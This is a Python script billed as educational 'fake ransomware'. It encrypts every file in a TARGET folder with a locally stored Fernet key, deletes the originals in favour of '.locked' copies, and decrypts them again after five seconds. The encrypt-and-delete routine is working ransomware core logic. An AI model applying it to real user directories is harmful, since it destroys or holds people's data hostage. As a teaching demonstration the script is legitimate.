"""
Fake Ramsomware

For educational purposes

DISCLAIMER:
Use At Own Risk. Do not use with sensitive files.

Inspired from:
https://www.geeksforgeeks.org
"""
import os
import time
from cryptography.fernet import Fernet
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

EXCLUDED = [
    os.path.join(BASE_DIR, 'TARGET', '.AREA_FOR_ENCRYPTION'),
]


class FakeRansomware:
    target_dir = BASE_DIR / 'TARGET'
    keyfile_path = BASE_DIR / 'crypter' / 'key.dat'

    def __init__(self, key: bytes = None) -> None:
        """
        :key:
        """
        if key:
            self._key = key
            self._fernet = Fernet(self._key)
        else:
            try:
                self.read_key_from_file()
            except (ValueError, FileNotFoundError):
                self.generate_key()

    def generate_key(self) -> bytes:
        """Generate a new key, replacing old if exists. Caution"""
        key = Fernet.generate_key()
        with open(self.keyfile_path, 'wb') as file_:
            file_.write(key)
        self._fernet = Fernet(key)
        return key

    def read_key_from_file(self) -> None:
        with open(self.keyfile_path, 'rb') as filekey:
            self._key = filekey.read()
        self._fernet = Fernet(self._key)

    def encrypt_files(self) -> None:
        """Encrypt files and adding .locked extension"""
        for file_ in self.target_dir.rglob('**/*'):
            file_ = str(file_)
            if file_ in EXCLUDED or file_.split('.')[-1] == 'locked':
                # print(f'Excluido: {file_}')
                continue
            # else:
            #     print(f'No Excluido: {file_}')

            with open(file_, 'rb') as file:
                original = file.read()
            # Encrypting the file
            encrypted = self._fernet.encrypt(original)
            with open(file_ + '.locked', 'wb') as encrypted_file:
                encrypted_file.write(encrypted)
            os.remove(file_)
            print(f'Encrypting {file_.split("/")[-1]}')

    def decrypt(self):
        for file_ in self.target_dir.rglob('**/*.locked'):
            file_ = str(file_)
            with open(file_, 'rb') as enc_file:
                encrypted = enc_file.read()

            # decrypting the file
            decrypted = self._fernet.decrypt(encrypted)
            _decrypted = file_.replace('.locked', '')
            with open(_decrypted, 'wb') as dec_file:
                dec_file.write(decrypted)
            os.remove(file_)
            print(f'Decrypting {file_.split("/")[-1]}')


if __name__ == '__main__':
    ransomware = FakeRansomware()

    print('Generating key')
    ransomware.generate_key()

    print(f'Encrypting files in {ransomware.target_dir}')
    ransomware.encrypt_files()

    print('Waiting')
    time.sleep(5)

    print(f'Decrypting files in {ransomware.target_dir}')
    ransomware.decrypt()

    # # Pass a key as parameter
    # my_key = b'3xmxI-fQu51kTX9aCHHIfeKHRlbl8iW4UEAkAHo8CSw='
    # my_ransomware = FakeRansomware(key=my_key)
